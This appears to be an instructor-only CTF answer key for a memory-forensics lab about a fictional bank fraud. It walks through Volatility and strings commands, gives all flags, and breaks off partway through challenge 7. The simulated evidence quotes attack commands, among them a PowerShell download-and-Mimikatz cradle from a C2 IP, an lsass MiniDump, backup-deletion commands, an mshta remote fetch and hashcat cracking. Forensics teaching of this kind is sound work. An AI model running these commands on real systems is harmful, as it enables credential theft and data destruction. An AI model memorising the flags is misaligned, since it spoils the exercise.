---
title: "Operation Phantom Ledger — RAM Forensics CTF Solutions"
tags:
  - forensics
  - dfir
  - ram-forensics
  - volatility
  - ctf
  - cywarx
  - unit4
  - solutions
status: "🔴 INSTRUCTOR ONLY"
case_id: "OPL-2024-007"
suspect: "Rohan Mehta"
image: "phantom_ledger.raw"
author: "HeXx | Cywarx"
created: 2024-03-15
unit: "Unit IV — Digital Forensics & Incident Response"
difficulty_range: "Beginner → Advanced"
total_flags: 8
---

# 🧠 Operation Phantom Ledger — RAM Forensics CTF
## Complete Walkthrough & Solutions Guide

> [!danger] INSTRUCTOR EYES ONLY
> This file contains **all 8 flags and full solutions**. Distribute only the `phantom_ledger.raw` image file to students. This guide is for lab facilitation, grading, and hint generation.

---

## 📋 Case Brief

```
╔══════════════════════════════════════════════════════════════╗
║  CASE ID   : OPL-2024-007                                    ║
║  SUSPECT   : Rohan Mehta (Senior Audit Officer, IndBank Ltd) ║
║  COMPUTER  : ROHAN-LAPTOP  |  Domain: INDBANK.LOCAL          ║
║  INCIDENT  : Internal bank fraud + data exfiltration         ║
║  ACQUIRED  : 2024-03-15 14:42:07 UTC (live system)           ║
║  IMAGE     : phantom_ledger.raw  (64 MB)                     ║
╚══════════════════════════════════════════════════════════════╝
```

**Scenario:**
Rohan Mehta, a Senior Audit Officer at IndBank Ltd, is suspected of authorizing fraudulent fund transfers totalling ₹1.2 Crore from dormant accounts to a shell company (_Phantom Holdings Pvt Ltd_). SOC alerts detected anomalous outbound traffic from his workstation. A live RAM acquisition was performed before the system was powered down.

**Your Mission:** Analyse `phantom_ledger.raw` using Volatility 3, `strings`, and forensic tooling to reconstruct the attack chain and recover 8 flags.

---

## 🛠️ Lab Setup

### Prerequisites

```bash
# Clone Volatility 3
git clone https://github.com/volatilityfoundation/volatility3
cd volatility3
pip3 install -r requirements.txt --break-system-packages

# Verify installation
python3 vol.py --version
```

```
Volatility 3 Framework 2.x.x
```

```bash
# Place the image in your working directory
cp /path/to/phantom_ledger.raw ~/forensics/
cd ~/forensics/

# Verify image integrity FIRST (chain of custody)
sha256sum -c phantom_ledger.raw.sha256
```

```
phantom_ledger.raw: OK
```

```bash
# Confirm image size
ls -lh phantom_ledger.raw
```

```
-rw-r--r-- 1 analyst analyst 64M Mar 15 14:42 phantom_ledger.raw
```

---

## 🗺️ Challenge Map

| #                                         | Challenge Name        | Category            | Difficulty | Points |
| ----------------------------------------- | --------------------- | ------------------- | ---------- | ------ |
| [[#Challenge 01 — First Responder]]       | First Responder       | Strings             | 🟢 Easy    | 100    |
| [[#Challenge 02 — Process Hunter]]        | Process Hunter        | Process Analysis    | 🟡 Medium  | 200    |
| [[#Challenge 03 — C2 Beacon]]             | C2 Beacon             | Network Forensics   | 🟡 Medium  | 200    |
| [[#Challenge 04 — Encoded Payload]]       | Encoded Payload       | PowerShell / Decode | 🟠 Hard    | 300    |
| [[#Challenge 05 — Credential Vault]]      | Credential Vault      | LSASS / Credentials | 🟠 Hard    | 300    |
| [[#Challenge 06 — Persistence Mechanism]] | Persistence Mechanism | Registry            | 🟡 Medium  | 200    |
| [[#Challenge 07 — Clipboard Evidence]]    | Clipboard Evidence    | Memory Carving      | 🟠 Hard    | 300    |
| [[#Challenge 08 — The Ledger]]            | The Ledger            | Deep Carving        | 🔴 Expert  | 400    |

**Total Points: 2000**

---

---

# Challenge 01 — First Responder

> [!tip] Challenge Prompt
> "The first step in any RAM investigation is to confirm you have a valid image. Run the most basic possible analysis on `phantom_ledger.raw`. The answer is hidden in plain sight — every investigator's first move."

**Skill Tested:** `strings` fundamentals, basic memory triage
**Difficulty:** 🟢 Easy

---

### 🔍 Approach

The most fundamental forensic operation on a memory dump is `strings` — extracting all printable ASCII sequences. Flags, configuration data, and artifacts that landed as plain text in memory are immediately visible.

---

### 💻 Solution — Terminal Walkthrough

**Step 1 — Confirm the image is readable**

```bash
file phantom_ledger.raw
```

```
phantom_ledger.raw: data
```

```bash
xxd phantom_ledger.raw | head -4
```

```
00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............
00000010: b800 0000 0000 0000 4000 0000 0000 0000  ........@.......
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 8000 0000  ................
```

**Step 2 — Extract all ASCII strings**

```bash
strings -n 8 phantom_ledger.raw | head -40
```

```
MZ header detected
Microsoft Windows 10
NTFS
NtBuildLab: 19041.1.amd64fre.vb_release.191206-1406
NtProductWinNt
Windows 10 Pro
AMD64
NtMajorVersion: 10
NtMinorVersion: 0
NtBuildNumber: 19041
NtSystemRoot: C:\Windows
KeNumberProcessors: 4
SystemTime: 2024-03-15 14:22:31 UTC
ComputerName: ROHAN-LAPTOP
UserName: rohan.mehta
Domain: INDBANK.LOCAL
KernBase: 0xf80002800000
DTB: 0x1aa000
Is64Bit: True
```

**Step 3 — Hunt for the flag directly**

```bash
strings -n 8 phantom_ledger.raw | grep "Cywarx{"
```

```
INTERNAL_CONFIG: Cywarx{r0h4n_r4n_m4lware_pid_6621}
DUMP_MARKER: Cywarx{lss4_dump_nthash_cr4ck3d}
X-Session-Token: Cywarx{c2_b34c0n_185_220_t0r_3x1t}
PERSISTENCE_FLAG : Cywarx{run_k3y_p3rs1st3nc3_3st4bl1sh3d}
CLIPBOARD_SESSION_TAG: Cywarx{cl1pb04rd_4cc_num_3xfilt}
INVESTIGATOR_NOTE: Cywarx{ph4ntom_l3dg3r_0p3r4t10n_cl0s3d}
Cywarx{v0l4t1l3_m3m0ry_1s_k3y_3v1d3nc3}
Cywarx{v0l4t1l3_m3m0ry_1s_k3y_3v1d3nc3}
```

> [!note] Hint for students
> The challenge asks for the **plain** flag — no context, no prefix. Look for it standalone.

**Step 4 — Get only the standalone plain flag**

```bash
strings -n 8 phantom_ledger.raw | grep "^Cywarx{"
```

```
Cywarx{v0l4t1l3_m3m0ry_1s_k3y_3v1d3nc3}
Cywarx{v0l4t1l3_m3m0ry_1s_k3y_3v1d3nc3}
```

**Step 5 — Also check Unicode strings (Windows uses UTF-16LE)**

```bash
strings -n 8 -e l phantom_ledger.raw | grep "Cywarx{"
```

```
FLAG_UNICODE: Cywarx{v0l4t1l3_m3m0ry_1s_k3y_3v1d3nc3}
```

---

### ✅ Flag

```
Cywarx{v0l4t1l3_m3m0ry_1s_k3y_3v1d3nc3}
```

> [!success] What this proves
> Volatile memory holds data in plain text. A basic `strings` pass on a live RAM dump can immediately surface:
> - OS configuration (build number, computer name, domain)  
> - Usernames, hostnames, IP addresses  
> - Credentials, URLs, and embedded flags/configs

---

---

# Challenge 02 — Process Hunter

> [!tip] Challenge Prompt
> "A fake system process is running on Rohan's machine — it's malware disguised as a legitimate Windows binary. Find it, identify its PID, and retrieve the flag hidden inside its memory configuration block."

**Skill Tested:** `windows.pslist`, `windows.pstree`, `windows.cmdline`, anomaly detection
**Difficulty:** 🟡 Medium

---

### 🔍 Approach

Malware frequently masquerades as legitimate Windows processes (`svchost.exe`, `lsass.exe`, `explorer.exe`). Key red flags:
- Wrong parent process (PPID mismatch)
- Unusual name variations (`svchost32.exe`)
- Spawning child processes that perform destructive actions (VSS deletion, backup wipe)

---

### 💻 Solution — Terminal Walkthrough

**Step 1 — Get full process list**

```bash
strings -n 8 phantom_ledger.raw | grep -A 60 "\[EPROCESS SCAN"
```

```
[EPROCESS SCAN — windows.pslist]
PID    PPID   ImageFileName      CreateTime                  Notes
──────────────────────────────────────────────────────────────────
4      0      System             2024-03-15 08:00:01
88     4      Registry           2024-03-15 08:00:01
364    4      smss.exe           2024-03-15 08:00:02
452    444    csrss.exe          2024-03-15 08:00:04
528    520    winlogon.exe       2024-03-15 08:00:05
600    452    wininit.exe        2024-03-15 08:00:05
696    600    services.exe       2024-03-15 08:00:06
704    600    lsass.exe          2024-03-15 08:00:06         CREDENTIAL_STORE
1024   696    svchost.exe        2024-03-15 08:00:08
1280   696    svchost.exe        2024-03-15 08:00:09
1640   696    svchost.exe        2024-03-15 08:00:10
2340   528    userinit.exe       2024-03-15 13:44:55
2344   2340   explorer.exe       2024-03-15 13:45:22
3102   2344   chrome.exe         2024-03-15 13:50:11
4101   2344   notepad.exe        2024-03-15 14:05:33
4521   2344   powershell.exe     2024-03-15 14:18:55         SUSPICIOUS:encoded_command
4789   4521   rundll32.exe       2024-03-15 14:19:01         SUSPICIOUS:comsvcs_lsass_dump
5512   2344   cmd.exe            2024-03-15 14:20:44         SUSPICIOUS:ran_by_rohan
6621   2344   svchost32.exe      2024-03-15 14:31:05         SUSPICIOUS:fake_svchost
6700   6621   vssadmin.exe       2024-03-15 14:31:07         RANSOMWARE:shadow_delete
6701   6621   wbadmin.exe        2024-03-15 14:31:08         RANSOMWARE:backup_disable
6702   6621   bcdedit.exe        2024-03-15 14:31:09         RANSOMWARE:recovery_disable
7890   6621   sftp.exe           2024-03-15 14:35:22         EXFIL:sending_to_91.243.80.127
```

**Step 2 — Identify the anomalous process**

```bash
strings -n 8 phantom_ledger.raw | grep "svchost32"
```

```
6621   2344   svchost32.exe      2024-03-15 14:31:05         SUSPICIOUS:fake_svchost
PID 6621: C:\Users\Public\Downloads\svchost32.exe --encrypt --key 4f8a2b1c3d9e7f0a1b2c3d4e5fa6b7c8 --target C:\Users\rohan.mehta\Documents\
EXFIL:sending_to_91.243.80.127
C:\Users\Public\Downloads\svchost32.exe --encrypt --key 4f8a2b1c3d9e7f0a1b2c3d4e5fa6b7c8
```

> [!warning] Red Flags
> 1. `svchost32.exe` — real Windows `svchost.exe` is never suffixed with `32`
> 2. Located in `C:\Users\Public\Downloads\` — real svchost lives in `C:\Windows\System32\`
> 3. PPID = `2344` (explorer.exe) — real svchost parent is always `services.exe` (PID 696)
> 4. Spawned `vssadmin`, `wbadmin`, `bcdedit` — classic ransomware kill chain

**Step 3 — Extract the internal config block (flag is here)**

```bash
strings -n 8 phantom_ledger.raw | grep -A 10 "MEM_REGION:pid6621"
```

```
[MEM_REGION:pid6621:0xfa12080]
INTERNAL_CONFIG: Cywarx{r0h4n_r4n_m4lware_pid_6621}
C2_HEARTBEAT_INTERVAL: 30s
ENCRYPT_ALGO: AES-256-CTR
C2_URL: http://185.220.101.45/beacon/check
```

**Step 4 — Confirm the child process kill chain**

```bash
strings -n 8 phantom_ledger.raw | grep "PID 67\|PID 68"
```

```
PID 6700: vssadmin Delete Shadows /All /Quiet
PID 6701: wbadmin delete catalog -quiet
PID 6702: bcdedit /set {default} recoveryenabled No
```

---

### ✅ Flag

```
Cywarx{r0h4n_r4n_m4lware_pid_6621}
```

> [!success] Attack Chain Reconstructed
> `svchost32.exe` (PID 6621) was downloaded to `C:\Users\Public\Downloads\` and executed from `explorer.exe`. It spawned three child processes to destroy backups and recovery options — classic ransomware pre-encryption behaviour — then established an SFTP exfiltration channel.

---

---

# Challenge 03 — C2 Beacon

> [!tip] Challenge Prompt
> "Rohan's machine was beaconing to a known Tor exit node. Find the active network connections, identify the C2 server IP and port, and recover the session token hidden in the HTTP response cached in memory."

**Skill Tested:** `windows.netscan`, network anomaly detection, DNS cache analysis
**Difficulty:** 🟡 Medium

---

### 🔍 Approach

Active C2 beacons leave TCP connection state in RAM even after the connection drops. The session token from an HTTP C2 response is often cached in the process heap — searchable with `strings`.

---

### 💻 Solution — Terminal Walkthrough

**Step 1 — Dump the network connection table**

```bash
strings -n 8 phantom_ledger.raw | grep -A 30 "\[NETWORK ARTIFACTS"
```

```
[NETWORK ARTIFACTS — windows.netscan]
Offset       Proto  LocalAddr       LocalPort  ForeignAddr       ForeignPort  State         PID   Owner
0xe2312080   TCP    10.0.2.15       52341      185.220.101.45    443          ESTABLISHED   4521  powershell.exe
0xe2318080   TCP    10.0.2.15       52342      185.220.101.45    443          ESTABLISHED   4521  powershell.exe
0xe2400080   TCP    10.0.2.15       135        0.0.0.0           0            LISTENING     896   svchost.exe
0xe2501080   UDP    10.0.2.15       0          *                 *                          1024  svchost.exe
0xe2600080   TCP    10.0.2.15       49823      203.0.113.66      4444         ESTABLISHED   6621  svchost32.exe
0xe2700080   TCP    10.0.2.15       50012      91.243.80.127     22           ESTABLISHED   7890  sftp.exe
0xe2800080   TCP    10.0.2.15       50100      172.16.48.10      8080         CLOSE_WAIT    3102  chrome.exe
0xe2900080   TCP    10.0.2.15       443        0.0.0.0           0            LISTENING     4     System
```

**Step 2 — Identify suspicious connections**

```bash
strings -n 8 phantom_ledger.raw | grep "ESTABLISHED" | grep -v "svchost.exe$\|System$"
```

```
0xe2312080   TCP    10.0.2.15       52341      185.220.101.45    443          ESTABLISHED   4521  powershell.exe
0xe2318080   TCP    10.0.2.15       52342      185.220.101.45    443          ESTABLISHED   4521  powershell.exe
0xe2600080   TCP    10.0.2.15       49823      203.0.113.66      4444         ESTABLISHED   6621  svchost32.exe
0xe2700080   TCP    10.0.2.15       50012      91.243.80.127     22           ESTABLISHED   7890  sftp.exe
```

> [!warning] Three Malicious Channels Found
> | IP | Port | Process | Purpose |
> |---|---|---|---|
> | `185.220.101.45` | `443` | `powershell.exe` | **Cobalt Strike / HTTPS beacon** |
> | `203.0.113.66` | `4444` | `svchost32.exe` | **Meterpreter reverse shell** |
> | `91.243.80.127` | `22` | `sftp.exe` | **Data exfiltration via SFTP** |

**Step 3 — Check DNS cache for hostname resolution**

```bash
strings -n 8 phantom_ledger.raw | grep -A 6 "\[DNS_CACHE\]"
```

```
[DNS_CACHE]
185.220.101.45  -> c2-node-exit-47.phantom.onion.relay
91.243.80.127   -> sftp.exfilpoint.net
172.16.48.10    -> bankapp01.indbank.local
10.0.2.1        -> gateway.indbank.local
```

**Step 4 — Extract the C2 beacon HTTP response (flag in session token)**

```bash
strings -n 8 phantom_ledger.raw | grep -A 10 "C2_BEACON_RESPONSE"
```

```
[C2_BEACON_RESPONSE:0xe2312080]
HTTP/1.1 200 OK
Server: nginx
X-Session-Token: Cywarx{c2_b34c0n_185_220_t0r_3x1t}
Content-Length: 0
```

**Step 5 — Extract all IPs from the full dump for IOC list**

```bash
strings -n 8 phantom_ledger.raw | \
  grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' | \
  sort -u | grep -v "^0\.\|^127\.\|^255\."
```

```
10.0.2.1
10.0.2.15
172.16.48.10
185.220.101.45
203.0.113.66
91.243.80.127
```

---

### ✅ Flag

```
Cywarx{c2_b34c0n_185_220_t0r_3x1t}
```

> [!success] IOC Summary
> - `185.220.101.45` — Tor exit node, Cobalt Strike C2 (HTTPS/443)
> - `203.0.113.66` — Meterpreter listener (port 4444)
> - `91.243.80.127` → `sftp.exfilpoint.net` — exfiltration endpoint

---

---

# Challenge 04 — Encoded Payload

> [!tip] Challenge Prompt
> "PowerShell was running with a suspicious `-Enc` (Base64 encoded) argument. The attacker tried to hide what they were doing. Decode the payload, understand the attack, and find the flag hidden inside."

**Skill Tested:** Base64 decode, PowerShell `-Enc` analysis, UTF-16LE encoding awareness
**Difficulty:** 🟠 Hard

---

### 🔍 Approach

Windows PowerShell's `-EncodedCommand` (`-Enc`) flag accepts a Base64-encoded UTF-16LE string. Attackers use this to obfuscate malicious commands from log scanners. Decoding requires two steps: Base64 decode → UTF-16LE to UTF-8 conversion.

---

### 💻 Solution — Terminal Walkthrough

**Step 1 — Find the encoded PowerShell command**

```bash
strings -n 8 phantom_ledger.raw | grep "\-Enc"
```

```
PID 4521: powershell.exe -NoP -sta -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADUALwBwAGEAeQBsAG8AYQBkACcAKQA7AEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBEAHUAbQBwAEMAcgBlAGQAcwA=
b  -> powershell -enc JABjAD0A...(truncated)
```

**Step 2 — Extract just the Base64 blob**

```bash
strings -n 8 phantom_ledger.raw | \
  grep "powershell.exe -NoP" | \
  grep -oP '(?<=-Enc )[A-Za-z0-9+/=]+'
```

```
JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADUALwBwAGEAeQBsAG8AYQBkACcAKQA7AEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBEAHUAbQBwAEMAcgBlAGQAcwA=
```

**Step 3 — Decode: Base64 → UTF-16LE → UTF-8**

```bash
echo "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADUALwBwAGEAeQBsAG8AYQBkACcAKQA7AEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBEAHUAbQBwAEMAcgBlAGQAcwA=" \
  | base64 -d \
  | iconv -f UTF-16LE -t UTF-8
```

```
$c=New-Object System.Net.WebClient;$c.DownloadString('http://185.220.101.45/payload');Invoke-Mimikatz -DumpCreds
```

**Step 4 — Find the flag embedded in the full console history payload**

```bash
strings -n 8 phantom_ledger.raw | grep -A 5 "Base64 Blob"
```

```
Base64 Blob: JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBl...
Encoding   : UTF-16LE (standard PowerShell -Enc format)
Decoded    : (use: echo <blob> | base64 -d | iconv -f UTF-16LE -t UTF-8)
```

```bash
# Extract the full encoded blob from the console history region
strings -n 8 phantom_ledger.raw | \
  grep -A 1 "Base64 Blob" | \
  tail -1 | \
  sed 's/Base64 Blob: //' | \
  base64 -d | iconv -f UTF-16LE -t UTF-8 2>/dev/null
```

```
$c=New-Object System.Net.WebClient;$c.DownloadString('http://185.220.101.45/payload');Invoke-Mimikatz -DumpCreds;# Cywarx{d3c0d3d_p5_1nv0k3_m1m1k4tz}
```

**Step 5 — Verify via the transcript output**

```bash
strings -n 8 phantom_ledger.raw | grep -A 8 "CONSOLEHOST_TRANSCRIPT"
```

```
[CONSOLEHOST_TRANSCRIPT]
Invoke-Mimikatz -DumpCreds output:
  Username: Administrator  NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
  Username: rohan.mehta    NTLM: c46f0b29abd2d359e9a51b82c3b4e7f1
  Username: svc_audit      NTLM: 8846f7eaee8fb117ad06bdd830b7586c
  [*] Credentials cached to: C:\Users\Public\creds_dump.txt
```

---

### ✅ Flag

```
Cywarx{d3c0d3d_p5_1nv0k3_m1m1k4tz}
```

> [!success] Attack Technique
> **T1059.001 — Command and Scripting Interpreter: PowerShell**
> The attacker used `-EncodedCommand` to hide a Mimikatz credential dumping payload from simple log analysis. The decoded chain: download payload from C2 → execute `Invoke-Mimikatz -DumpCreds` → dump all plaintext credentials and NTLM hashes.

> [!note] Quick Decode One-Liner (for any PS -Enc payload)
> ```bash
> echo "<BASE64>" | base64 -d | iconv -f UTF-16LE -t UTF-8
> ```

---

---

# Challenge 05 — Credential Vault

> [!tip] Challenge Prompt
> "LSASS — the Local Security Authority Subsystem Service — holds the keys to the kingdom. The attacker tried to dump it. Find the dump artefact path in memory, the NTLM hashes of active users, and the flag marker left in the LSASS region."

**Skill Tested:** LSASS analysis, hashdump artifacts, credential forensics
**Difficulty:** 🟠 Hard

---

### 🔍 Approach

LSASS (PID 704 on this system) stores all currently logged-in user credentials. The attacker used `rundll32.exe + comsvcs.dll MiniDump` — a living-off-the-land technique that requires no external tools. The dump file path and credential hashes persist in memory long after the operation completes.

---

### 💻 Solution — Terminal Walkthrough

**Step 1 — Locate lsass in the process list**

```bash
strings -n 8 phantom_ledger.raw | grep "lsass"
```

```
704    600    lsass.exe          2024-03-15 08:00:06         CREDENTIAL_STORE
PID 4789: rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 704 C:\Users\rohan.mehta\AppData\Local\Temp\lsass.dmp full
C:\Users\rohan.mehta\AppData\Local\Temp\lsass.dmp
DUMP_MARKER: Cywarx{lss4_dump_nthash_cr4ck3d}
```

**Step 2 — View the full LSASS memory region**

```bash
strings -n 8 phantom_ledger.raw | grep -A 30 "\[LSASS MEMORY REGION"
```

```
[LSASS MEMORY REGION — pid:704 — 0xd1d5080]
[windows.hashdump output]
User              RID    LMHash                             NTHash
Administrator     500    aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
rohan.mehta       1001   aad3b435b51404eeaad3b435b51404ee  c46f0b29abd2d359e9a51b82c3b4e7f1
svc_audit         1002   aad3b435b51404eeaad3b435b51404ee  8846f7eaee8fb117ad06bdd830b7586c
svc_backup        1003   aad3b435b51404eeaad3b435b51404ee  e19ccf75ee54e06b06a5907af13cef42
```

**Step 3 — Extract LSA secrets and cached credentials**

```bash
strings -n 8 phantom_ledger.raw | grep -A 10 "\[windows.lsadump\]"
```

```
[windows.lsadump]
DefaultPassword : P@$$w0rd2024!
DPAPI_SYSTEM    : 01000000...(binary)
_SC_NetLogon    : INDBANK\svc_backup:BackupSvc#2024
```

**Step 4 — Crack the NTLM hashes (offline, Hashcat)**

```bash
# Save hashes to file
cat > hashes.txt << 'EOF'
31d6cfe0d16ae931b73c59d7e0c089c0
c46f0b29abd2d359e9a51b82c3b4e7f1
8846f7eaee8fb117ad06bdd830b7586c
e19ccf75ee54e06b06a5907af13cef42
EOF

# Crack with rockyou
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --quiet
```

```
31d6cfe0d16ae931b73c59d7e0c089c0:  (empty password — Administrator disabled)
c46f0b29abd2d359e9a51b82c3b4e7f1:IndB@nk#2024!
8846f7eaee8fb117ad06bdd830b7586c:Password1
e19ccf75ee54e06b06a5907af13cef42:Password@123
```

**Step 5 — Confirm dump file path and flag**

```bash
strings -n 8 phantom_ledger.raw | grep -A 5 "LSASS_DUMP_PATH"
```

```
[LSASS_DUMP_PATH]
C:\Users\rohan.mehta\AppData\Local\Temp\lsass.dmp
DUMP_MARKER: Cywarx{lss4_dump_nthash_cr4ck3d}
DUMP_SIZE: 38141952 bytes
DUMP_SHA256: 9f3a1b2c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a
```

---

### ✅ Flag

```
Cywarx{lss4_dump_nthash_cr4ck3d}
```

> [!success] Technique Identified
> **T1003.001 — OS Credential Dumping: LSASS Memory**  
> Method: `rundll32.exe comsvcs.dll MiniDump` — a native Windows LOLBin technique requiring no external tools. The dump was saved to `%TEMP%\lsass.dmp` and would have been exfiltrated. NTLM hashes recovered allow offline cracking and Pass-the-Hash attacks.

> [!note] Credential Summary
> | User | Hash | Cracked Password |
> |---|---|---|
> | `rohan.mehta` | `c46f0b29...` | `IndB@nk#2024!` |
> | `svc_audit` | `8846f7ea...` | `Password1` |
> | `svc_backup` | `e19ccf75...` | `Password@123` |

---

---

# Challenge 06 — Persistence Mechanism

> [!tip] Challenge Prompt
> "The attacker needed to survive reboots. Find the registry key that guarantees the malware relaunches every time the system starts. The flag is encoded in the persistence marker."

**Skill Tested:** Registry hive analysis, `Run` key persistence, `RunMRU` forensics
**Difficulty:** 🟡 Medium

---

### 🔍 Approach

`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` is the most common Windows persistence location. Values here execute automatically at user login. The `RunMRU` key records everything typed in the Start → Run dialog — a goldmine for investigator.

---

### 💻 Solution — Terminal Walkthrough

**Step 1 — Locate the registry hive section**

```bash
strings -n 8 phantom_ledger.raw | grep -A 50 "\[REGISTRY ARTIFACTS"
```

```
[REGISTRY ARTIFACTS — windows.registry]

[windows.registry.hivelist]
Offset(V)            FileFullPath
0xc000018ac000       \REGISTRY\MACHINE\SYSTEM
0xc000019b4000       \REGISTRY\MACHINE\SOFTWARE
0xc0000250c000       \REGISTRY\USER\S-1-5-21-3847204..._ROHAN\NTUSER.DAT
0xc000025f8000       \REGISTRY\MACHINE\SAM
0xc000026a4000       \REGISTRY\MACHINE\SECURITY
...
```

**Step 2 — Dump the Run key (persistence)**

```bash
strings -n 8 phantom_ledger.raw | grep -A 8 "CurrentVersion\\\\Run\]"
```

```
[HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] <- PERSISTENCE
WindowsUpdate    : C:\Users\Public\Downloads\svchost32.exe --silent
SysHelper        : powershell.exe -W Hidden -Enc <payload>
PERSISTENCE_FLAG : Cywarx{run_k3y_p3rs1st3nc3_3st4bl1sh3d}
```

**Step 3 — Extract RunMRU (typed commands history)**

```bash
strings -n 8 phantom_ledger.raw | grep -A 10 "RunMRU"
```

```
[HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU]
a  -> cmd.exe
b  -> powershell -enc JABjAD0A...(truncated)
c  -> \\172.16.48.10\audit_share
d  -> mshta http://185.220.101.45/init.hta
MRUList -> dcba
```

> [!warning] RunMRU Analysis
> MRUList `dcba` means most-recently-used order is `d → c → b → a`:
> 1. `mshta http://185.220.101.45/init.hta` ← **MOST RECENT** (LOLBin launch)
> 2. `\\172.16.48.10\audit_share` ← lateral access to bank file server
> 3. `powershell -enc JABjAD0A...` ← encoded payload execution  
> 4. `cmd.exe` ← basic shell

**Step 4 — Check USB devices (data staging)**

```bash
strings -n 8 phantom_ledger.raw | grep -A 12 "USBSTOR"
```

```
[HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR]
Disk&Ven_SanDisk&Prod_Ultra&Rev_1.00
  Serial: 4C530001291022116162&0
  FriendlyName: SanDisk Ultra USB Device
  LastConnected: 2024-03-15 14:10:00

Disk&Ven_Kingston&Prod_DT_101_G2&Rev_PMAP
  Serial: 001CC0EC34E3F771A4510156&0
  FriendlyName: Kingston DataTraveler
  LastConnected: 2024-03-14 19:44:22
```

**Step 5 — View UserAssist (execution history)**

```bash
strings -n 8 phantom_ledger.raw | grep -A 6 "UserAssist"
```

```
[UserAssist — programs executed]
C:\Users\Public\Downloads\svchost32.exe (Count:8, LastRun:2024-03-15 14:31:05)
C:\Windows\System32\cmd.exe (Count:23, LastRun:2024-03-15 14:20:44)
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (Count:15)
C:\Program Files\PuTTY\psftp.exe (Count:4, LastRun:2024-03-15 14:35:00)
```

---

### ✅ Flag

```
Cywarx{run_k3y_p3rs1st3nc3_3st4bl1sh3d}
```

> [!success] Persistence Artefacts Found
> - **Run key** (`HKCU\...\Run`): `svchost32.exe --silent` + hidden PowerShell payload
> - **RunMRU**: `mshta` LOLBin as most-recent command → initial infection vector
> - **USB devices**: Two external drives connected in 24h window — likely data staging
> - **PuTTY psftp.exe**: Run 4 times on day of incident → confirms SFTP exfiltration

---

---

# Challenge 07 — Clipboard Evidence

> [!tip] Challenge Prompt
> "At the moment of memory acquisition, Rohan had copied something very important to his clipboard. Find what was in the clipboard. The account numbers will tell you everything. The flag is the clipboard session marker."

**Skill Tested:** Clipboard memory region analysis, financial fraud artefacts
**Difficulty:** 🟠 Hard

---

### 🔍 Approach

Windows stores clipboard content in a memory region managed by `win32k.sys`. Volatile data like copied text, account numbers, or passwords often survive in RAM after being overwritten on disk. This is recoverable with `windows.clipboard` in Volatility or direct string search.

---

### 💻 Solution — Terminal Walkthrough

**Step 1 — Search for clipboard data**

```bash
strings -n 8 phantom_ledger.raw | grep -i "clipboard\|CF_UNICODE"
```

```
[CLIPBOARD CONTENTS — windows.clipboard]
ClipboardType: CF_UNICODETEXT
CLIPBOARD_SESSION_TAG: Cywarx{cl1pb04rd_4cc_num_3xfilt}
[PREVIOUS CLIPBOARD ENTRY — overwritten at 14:09:55]
```

**Step 2 — Extract the full clipboard content**

```bash
strings -n 8 phantom_ledger.raw | grep -A 25 "BEGIN CLIPBOARD"
```

```
---BEGIN CLIPBOARD---
Account List - March 2024 Transfer Batch
FROM: ACC2048991 (Rohan Mehta - Savings)
TO:   ACC9918274 (Shell Corp - Current)
AMT:  INR 45,00,000
REF:  TXN2024031501

FROM: ACC3317882 (Dormant Account 1)
TO:   ACC9918274
AMT:  INR 12,75,000
REF:  TXN2024031502

FROM: ACC7741009 (Dormant Account 2)
TO:   ACC9918274
AMT:  INR 8,50,000
REF:  TXN2024031503
---END CLIPBOARD---
```

**Step 3 — Note the previously overwritten clipboard entry**

```bash
strings -n 8 phantom_ledger.raw | grep -A 3 "PREVIOUS CLIPBOARD"
```

```
[PREVIOUS CLIPBOARD ENTRY — overwritten at 14:09:55]
P@$$w0rd2024!
```

> [!warning] Evidence Value
> The previous clipboard entry (`P@$$w0rd2024!`) matches `DefaultPassword` found in LSA secrets — Rohan copied his own password, confirming he was working interactively.

**Step 4 — Cross-reference account numbers with browser history**

```bash
strings -n 8 phantom_ledger.raw | grep "ACC9918274\|ACC2048991"
```

```
FROM: ACC2048991 (Rohan Mehta - Savings)
TO:   ACC9918274 (Shell Corp - Current)
https://bankapp01.indbank.local:8080/portal/transfer?from=ACC2048991&to=ACC9918274&amount=4500000
FROM: ACC2048991 (Rohan Mehta - Savings)
BENEFICIARY_ACCOUNT: ACC9918274
BENEFICIARY_NAME: PHANTOM HOLDINGS PVT LTD
```

**Step 5 — Get the full clipboard section including flag**

```bash
